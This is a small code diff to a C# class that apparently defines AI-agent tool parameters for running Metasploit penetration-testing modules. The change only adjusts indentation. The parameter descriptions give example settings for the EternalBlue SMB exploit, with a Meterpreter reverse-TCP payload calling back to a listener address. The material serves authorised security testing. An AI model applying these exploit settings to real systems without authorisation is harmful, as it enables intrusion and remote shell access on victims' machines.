@@ -27,10 +27,10 @@ public class PenetrationTools
             "Example: To exploit EternalBlue: {'module_name':'exploit/windows/smb/ms17_010_eternalblue','target':'192.168.1.5','module_options':{'RHOSTS':'192.168.1.5','LHOST':'10.0.0.1'}}")
         .AddParameter("module_name", PropertyDefinition.DefineString(
             "[REQUIRED] Full module path from search results. Example: 'exploit/windows/smb/ms17_010_eternalblue'"))
-      .AddParameter("module_options", PropertyDefinition.DefineString(
-    "JSON object with Metasploit module options. Must include 'RHOSTS'. " +
-    "Example: { \"RHOSTS\": \"192.168.1.5\", \"LHOST\": \"10.0.0.1\", \"PAYLOAD\": \"windows/meterpreter/reverse_tcp\" }"))
-.AddParameter("target", PropertyDefinition.DefineString(
+        .AddParameter("module_options", PropertyDefinition.DefineString(
+            "JSON object with Metasploit module options. Must include 'RHOSTS'. " +
+            "Example: { \"RHOSTS\": \"192.168.1.5\", \"LHOST\": \"10.0.0.1\", \"PAYLOAD\": \"windows/meterpreter/reverse_tcp\" }"))
+        .AddParameter("target", PropertyDefinition.DefineString(
             "[REQUIRED] IP/Domain/CIDR range. Validate format first. Example: '192.168.1.0/24'"))
         .AddParameter("agent_location", PropertyDefinition.DefineEnum(
             new List<string> { "aws-eu", "azure-us", "gcp-asia" },
